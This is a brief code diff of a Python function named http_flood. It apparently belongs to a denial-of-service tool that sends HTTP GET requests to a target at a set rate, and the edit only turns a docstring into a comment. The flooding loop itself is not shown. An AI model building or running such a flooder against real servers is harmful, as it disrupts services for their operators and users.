@@ -2,9 +2,7 @@ import socket
 import time
 
 def http_flood(target_ip, target_port, duration, rate):
-    """
-    Sends HTTP GET requests to a target at a specified rate for a given duration.
-    """
+    # Sends HTTP GET requests to a target at a specified rate for a given duration.
     print(f"[INFO] Starting HTTP flood on {target_ip}:{target_port} for {duration}s at ~{rate} req/s.")
     start_time = time.time()
     request_count = 0
